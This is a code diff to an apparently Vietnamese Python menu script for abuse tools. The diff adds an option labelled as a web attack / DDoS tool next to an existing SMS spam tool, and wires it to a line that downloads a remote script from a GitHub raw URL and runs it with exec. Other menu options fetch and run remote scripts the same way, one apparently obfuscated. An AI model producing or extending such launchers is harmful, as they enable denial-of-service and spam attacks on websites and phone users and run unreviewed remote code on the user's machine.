@@ -229,6 +229,10 @@ Write.Print('╔═════════════════════�
 Write.Print('║ TOOL  SPAM SMS  ║ \n',Colors.yellow,interval=0.0001,end='\r')
 Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
 print(f'{hong}[⟨⟩]➩ \033[1;35mNhập Số [12] TOOL SPAM SMS V1[NGON]\n')
+Write.Print('╔═════════════════════╗ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('║ TOOL  TẤN CÔNG WEB ║ \n',Colors.yellow,interval=0.0001,end='\r')
+Write.Print('╚═════════════════════╝ \n',Colors.yellow,interval=0.0001,end='\r')
+print(f'{hong}[⟨⟩]➩ \033[1;32mNhập Số [13] TOOL DDOS V1 [NGON]\n')
 import requests
 
 
@@ -274,8 +278,8 @@ elif chon =='11':
 	exec(requests.get('https://raw.githubusercontent.com/Nhatp1/Nhattool/main/fltik.py').text)
 elif chon == '3.1':
 	exec(requests.get('https://raw.githubusercontent.com/Nhatp1/Nhattool/main/obf-6892498050.py').text)
-#elif chon == '13':
-#	exec(requests.get('https://raw.githubusercontent.com/Nhatp1/Nhatp1/main/gettoken.py').text)
+elif chon == '13':
+	exec(requests.get('https://raw.githubusercontent.com/Nhatp1/Nhattool/main/dosv1.py').text)
 #elif chon == '14':
 #	exec(requests.get('https://raw.githubusercontent.com/Nhatp1/Nhatp1/main/prx.py').text)
 else:
